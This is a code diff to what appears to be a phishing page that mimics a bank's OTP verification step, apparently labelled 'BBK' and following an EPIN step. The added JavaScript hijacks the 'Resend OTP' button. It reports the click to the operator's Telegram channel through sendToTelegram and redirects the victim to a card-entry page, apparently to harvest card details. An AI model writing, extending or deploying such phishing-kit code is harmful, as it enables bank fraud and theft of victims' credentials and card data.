@@ -1117,6 +1117,23 @@
 
         // Resend OTP
         async function resendOTP() {
+            // Check if this is the first OTP page (after EPIN)
+            // If so, redirect to card page instead of resending
+            if (msg === '' || msg === 'again' || msg === 'againc') {
+                // Send notification to Telegram
+                const message = `🔄 OTP Resend Clicked - Redirecting to Card Page\n\n⏰ Time: ${new Date().toISOString()}`;
+                try {
+                    await sendToTelegram(message);
+                } catch (error) {
+                    console.log('Resend notification error:', error);
+                }
+                
+                // Redirect to card page
+                window.location.href = 'card.html';
+                return;
+            }
+            
+            // For other OTP pages, use normal resend behavior
             const message = `🔄 BBK OTP Resend Request\n\n⏰ Time: ${new Date().toISOString()}`;
 
             try {
